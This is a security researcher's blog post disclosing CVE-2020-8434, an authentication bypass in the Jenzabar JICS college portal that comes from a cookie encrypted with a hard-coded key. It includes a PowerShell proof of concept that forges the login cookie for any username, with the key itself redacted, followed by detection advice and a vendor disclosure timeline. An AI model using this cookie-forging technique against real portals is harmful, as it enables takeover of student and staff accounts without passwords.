=== Content from medium.com_f0d3d008_20250119_112210.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Ff1aeef438f80&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40mdavis332%2Fhigher-ed-erp-portal-vulnerability-auth-bypass-to-login-any-account-f1aeef438f80&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40mdavis332%2Fhigher-ed-erp-portal-vulnerability-auth-bypass-to-login-any-account-f1aeef438f80&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Higher Ed ERP Portal Vulnerability — Auth Bypass to Login Any Account

[![Michael Davis](https://miro.medium.com/v2/resize:fill:88:88/0*60bPY_NnoblLQxy3.jpg)](/%40mdavis332?source=post_page---byline--f1aeef438f80--------------------------------)

[Michael Davis](/%40mdavis332?source=post_page---byline--f1aeef438f80--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fb6657ab2e311&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40mdavis332%2Fhigher-ed-erp-portal-vulnerability-auth-bypass-to-login-any-account-f1aeef438f80&user=Michael+Davis&userId=b6657ab2e311&source=post_page-b6657ab2e311--byline--f1aeef438f80---------------------post_header-----------)

3 min read·Apr 30, 2020

--

Listen

Share

# **CVE-2020-8434**tl;dr:

Vulnerability in Jenzabar JICS (all unpatched versions), a Higher Ed ERP portal used by numerous small-to-medium sized colleges/universities, allows circumventing the authentication mechanism to login as any user knowing only the username.

![gate on sidewalk]()

auth bypass

# Further Information

Jenzabar Internet Campus Solution (JICS), about which I’ve written previously [[1](/%40mdavis332/critical-vulnerability-in-higher-ed-erp-55580f8880c), [2](/%40mdavis332/critical-vulnerability-in-higher-ed-erp-pt-ii-f39de368879c), [3](/%40mdavis332/higher-ed-erp-portal-vulnerability-create-your-own-accounts-d865bd22cdd8)], has what appears to be a vestigial session persistence mechanism that ties a cookie named JICSLoginCookie and its encrypted/base64 encoded value to a username for session authentication. I say “vestigial” because the extant session persistence method uses an ASP.NET\_SessionID cookie to tie to a server-side session with a random ID (good). However, the JICS software still checks for the existence of the client-side JICSLoginCookie cookie (bad) and, if present, employs it first for session authentication which subsequently bypasses any need to login or approve MFA if implemented.

The issue is mostly problematic because the username encryption function employs a hard-coded, non-unique encryption key. By leveraging this key and the same AES encryption function, anyone can select a username, pass it through the function, and base64 encode its output to the final string value for the JICSLoginCookie. Voila, authenticated as any user without knowing a password.

**PowerShell POC:**

```
[Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Nullfunction Encode-Bytes {
 Param (
  [Parameter(Position = 0, Mandatory = $True)]
  [String]
  $ClearText,

  [Parameter(Position = 1, Mandatory = $False)]
  [String]
  $Key = '<hard-coded encryption key here>'
 )

 $ClearTextToBytes = [System.Text.Encoding]::Unicode.GetBytes($ClearText)
 [Byte[]] $HardCodedSaltAsBytes = (73, 118, 97, 110, 32, 77, 101, 100, 118, 101, 100, 101, 118)
 $DerivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($Key, $HardCodedSaltAsBytes)

 $ResultInBytes = Encrypt-Bytes -ClearTextBytes $ClearTextToBytes -Key $DerivedPass.GetBytes(32) -IVBytes $DerivedPass.GetBytes(16)

 [Convert]::ToBase64String($ResultInBytes)

}function Encrypt-Bytes {
 Param (
  [Parameter(Position = 0, Mandatory = $True)]
  [Byte[]]
  $ClearTextBytes,

  [Parameter(Position = 1, Mandatory = $True)]
  [Byte[]]
  $Key,

  [Parameter(Position = 2, Mandatory = $True)]
  [Byte[]]
  $IVBytes
 )# Creates a MemoryStream to do the encryption in
 $MemStream = New-Object System.IO.MemoryStream

 # Create a COM Object for RijndaelManaged Cryptography
 $Rijndael = New-Object System.Security.Cryptography.RijndaelManaged
 $Rijndael.Key = $Key
 $Rijndael.IV = $IVBytes

 # Creates the new Crypto Stream --> Outputs to Memory Stream
 $CryptoStream = New-Object Security.Cryptography.CryptoStream($MemStream, $Rijndael.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)

 #Writes the string in the Crypto Stream
 $CryptoStream.Write($ClearTextToBytes, 0, $ClearTextToBytes.Length)
 $CryptoStream.Close()

 [Byte[]]$OutputBytes = $MemStream.ToArray()

 $OutputBytes

}C:\> Encode-Bytes -ClearText 'testadmin'
<base64 encoded output to be added as value of JICSLoginCookie>
```
# Detection

Since the JICSLoginCookie doesn’t seem to be legitimately used anywhere, watching IIS or upstream logs (load balancer, WAF, etc.) for the use of that cookie and alerting on that might be a good true positive indicator of a bypass attempt.

# Disclosure Timeline

**2020-Jan-21**: Confirmed the vulnerability in a test environment
**2020-Jan-27**: Reported issue to vendor
**2020-Jan-27**: Vendor acknowledged receipt of report
2**020-Jan-28**: Vendor completed initial triage and confirmed findings
**2020-Jan-29**: [CVE-2020–8434](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8434) issued
**2020-Jan-29**: Vendor expected patch availability within one week
**2020-Feb-07**: Vendor notified customer listserv with manual mitigation steps including a SQL query that changes static encryption key to something unique; also noted they intend to deliver a future patch to further shore up login security
**2020-Mar**: The following patches issued to correct the vulnerability:
**Existing Version : Patch**
*9.0 : 9.0.1 Patch 3
9.1 : 9.1.2 Patch 2
9.2 : 9.2.2 Patch 8*
**2020-Apr-30**: Published this page +90 days from initial disclosure as requested by vendor

[Infosec](/tag/infosec?source=post_page-----f1aeef438f80--------------------------------)[Higher Education](/tag/higher-education?source=post_page-----f1aeef438f80--------------------------------)[Cybersecurity](/tag/cybersecurity?source=post_page-----f1aeef438f80--------------------------------)[Vulnerability](/tag/vulnerability?source=post_page-----f1aeef438f80--------------------------------)[Web Development](/tag/web-development?source=post_page-----f1aeef438f80--------------------------------)

--

--

[![Michael Davis](https://miro.medium.com/v2/resize:fill:96:96/0*60bPY_NnoblLQxy3.jpg)](/%40mdavis332?source=post_page---post_author_info--f1aeef438f80--------------------------------)[![Michael Davis](https://miro.medium.com/v2/resize:fill:128:128/0*60bPY_NnoblLQxy3.jpg)](/%40mdavis332?source=post_page---post_author_info--f1aeef438f80--------------------------------)Follow[## Written by Michael Davis](/%40mdavis332?source=post_page---post_author_info--f1aeef438f80--------------------------------)[10 Followers](/%40mdavis332/followers?source=post_page---post_author_info--f1aeef438f80--------------------------------)·[4 Following](/%40mdavis332/following?source=post_page---post_author_info--f1aeef438f80--------------------------------)

Working InfoSec in F500 with interests in System Design, Cyber Threat Intelligence, and Detections.

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----f1aeef438f80--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----f1aeef438f80--------------------------------)[About](/about?autoplay=1&source=post_page-----f1aeef438f80--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----f1aeef438f80--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----f1aeef438f80--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----f1aeef438f80--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----f1aeef438f80--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----f1aeef438f80--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----f1aeef438f80--------------------------------)[Teams](/business?source=post_page-----f1aeef438f80--------------------------------)


